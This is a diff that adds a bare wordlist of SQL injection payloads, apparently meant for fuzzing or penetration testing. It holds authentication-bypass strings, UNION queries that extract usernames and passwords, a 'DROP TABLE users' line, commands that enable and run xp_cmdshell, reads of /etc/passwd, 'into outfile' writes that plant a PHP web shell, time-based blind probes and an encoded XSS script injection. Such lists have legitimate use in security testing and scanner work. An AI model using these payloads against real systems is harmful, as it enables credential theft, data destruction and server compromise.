@@ -1,0 +1,75 @@
+' OR '1'='1
+' OR '1'='1' --
+' OR '1'='1' /*
+') OR ('1'='1
+'; DROP TABLE users; --
+UNION SELECT NULL, username, password FROM users--
+'; EXEC xp_cmdshell('whoami')--
+' AND 1=CONVERT(int, (SELECT @@version))--
+OR 1=1
+OR 1=1--
+OR 1=1#
+OR 1=1/*
+' OR 'a'='a
+' OR 'a'='a'--
+' OR 'a'='a'#
+' OR 'a'='a'/*
+') OR ('a'='a
+') OR ('a'='a'--
+') OR ('a'='a'#
+') OR ('a'='a'/*
+1 OR 1=1
+1 OR 1=1--
+1 OR 1=1#
+1 OR 1=1/*
+1' OR 1=1#
+1' OR 1=1--
+1' OR 1=1/*
+1') OR 1=1#
+1') OR 1=1--
+1') OR 1=1/*
+admin'--
+admin' #
+admin'/*
+admin' or '1'='1
+admin' or '1'='1'--
+admin' or '1'='1'#
+admin' or '1'='1'/*
+admin'or 1=1 or ''='
+admin' or 1=1
+admin' or 1=1--
+admin' or 1=1#
+admin' or 1=1/*
+admin') or ('1'='1
+admin') or ('1'='1'--
+admin') or ('1'='1'#
+admin') or ('1'='1'/*
+1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
+admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
+concat(0x3c2f7370616e3e,0x3c7363726970743e616c657274282258535322293c2f7363726970743e,0x3c7370616e3e)
+system('cat /etc/passwd')
+exec xp_cmdshell('dir')
+exec master..xp_cmdshell 'dir'
+exec sp_configure 'show advanced options', 1;RECONFIGURE;exec sp_configure 'xp_cmdshell', 1;RECONFIGURE;
+@@version
+version()
+database()
+user()
+current_user()
+connection_id()
+schema_name()
+table_name
+column_name
+load_file('/etc/passwd')
+into outfile '/var/www/html/shell.php'
+into dumpfile '/var/www/html/shell.php'
+group_concat(table_name)
+group_concat(column_name)
+substring(version(),1,10)
+ascii(substring((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))
+ord(mid((select user()),1,1))>100
+benchmark(10000000,MD5(1))
+sleep(5)
+waitfor delay '0:0:5'
+pg_sleep(5)
+dbms_pipe.receive_message('a',10)
